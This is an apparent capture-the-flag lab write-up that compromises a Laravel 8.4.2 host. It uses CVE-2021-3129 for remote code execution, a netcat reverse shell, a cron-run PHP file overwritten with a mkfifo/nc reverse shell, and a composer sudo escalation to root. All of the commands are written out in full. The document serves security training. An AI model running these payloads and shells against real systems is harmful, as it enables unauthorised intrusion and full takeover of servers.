# Information Gathering 

Given the target URL, we will first attempt to see if there is any visible web page available. When visiting the target URL we are met with a consulting website that appears to have a login page for a "Demo" page. 

Registration info:
test@hacker.com
12345678

After registering we land on the demo page which allows us to upload file attachments. In addition to the demo, we can enable or disable debugging mode for more information. 

Since we know the web page is taking file uploads, we can attempt to perform file injection attacks with different code versions.

Unfortunately, after several different file attempts, we are unable to get any debugging information or reverse shell accesses. 

Let's validate the HTTP methods using Burpsuite. 

Using Burpsuite, we notice that when the file is directly uploaded, the subdomain which the GET requests is intended is different from the target IP. Once we remove this domain, we land directly on a debugging redirect page. 

From this page, we can gather information about the target IP and server information. Specifically, we find out that the target IP is running Laravel version 8.4.2.
# Service Enumeration

After researching for known vulnerabilities of Laravel 8.4.2, we find CVE-2021-3129. This CVE makes use of **Ignition**, an error page built specifically for applications that are run by default on Laravel versions six (6) and greater.

The exploit directly makes use of insecure usages of two methods with the **Ignition** page, *file_get_contents() and file_put_content()*.

Since this is a known exploit, we found a GitLab repository that helps us use this exploit on the vulnerable target IP -> https://github.com/joshuavanderpoll/CVE-2021-3129

After downloading and installing the required libraries, we run the below command to exploit the machine.

	python3 CVE-2021-3129.py --host http://192.168.XXX.XXX/ --exec id

Output:

	uid=33(www-data) gid=33(www-data) groups=33(www-data)

Now that we have successful remote code execution, we can set up a reverse shell and gain access to the target machine:

	python3 CVE-2021-3129.py --host http://192.168.XXX.XXX/ --exec 'nc -c sh 192.168.XXX.XXX 80'

Success! We have received a connection as the user, "www-data." The local flag can be found in the home directory.


# Privilege Escalation

Now that we have a foothold on the machine we can attempt to find an escalation point for root access. 

There is a folder in the home directory named, "skunk" which holds the local flag, we can check */etc/passwd* to see if any user shares this name. Surprisingly there is! On top of this, the "skunk" user appears to be in the (sudo) group.

After some light directory transversal we did not find any potential vulnerable openings on the target machine. However, we should check the "skunk" user to see if there are openings on this accounts.

Since we don't have direct access to this user account, we can use the *pspy* open source library to check processes running on the account -> https://github.com/DominicBreuker/pspy?source=post_page-----12bfd272e9cf-----------------------------------------

After installation of the library and running the snooping process, we learn that there is a cron-job running on the "artisan" file in the */var/www/html/lavita* directory.

We can manipulate this file into give us a "skunk" user shell by replacing the current artisan file with our own version.

To perform this, we set up a listener and run the below commands:

	rm artisan
	echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.162 4444 >/tmp/f"); ?>' > artisan

With a listener set up on our local machine, we get a reverse shell as the "skunk user"

	whoami
	skunk

Now that we are using the privileged skunk user, let's check the sudo commands available to us. 

	sudo -l 

Output:

	User skunk may run the following commands on debian:  
	   (ALL : ALL) ALL  
	   (root) NOPASSWD: /usr/bin/composer --working-dir\=/var/www/html/lavita *

Let's check GTFOBins for any available escalation command for "composer." With luck, the composer command can be run with sudo to gain root privileges. 

However, before we run the main command, GTFOBins requires us to edit the *composer.json* file. This file is found directly in the */var/www/html/lavita* directory.

Let's create move the current version of console.json:

	mv console.json mv console.orig
	touch console.json

As the "skunk" user we are blocked from performing the first command. However, we can use our original shell as the "www-data" user to move this file with no denied permissions.

Moving back to the "skunk" user,  we perform the escalation commands:

	echo '{"scripts":{"x":"/bin/sh"}}' >composer.json

	sudo -u root /usr/bin/composer --working-dir\=/var/www/html/lavita run-script x

Success! Using the escalation command we achieve a root shell. The proof.txt flag for this lab can be found in the root home directory. The machine is now solved.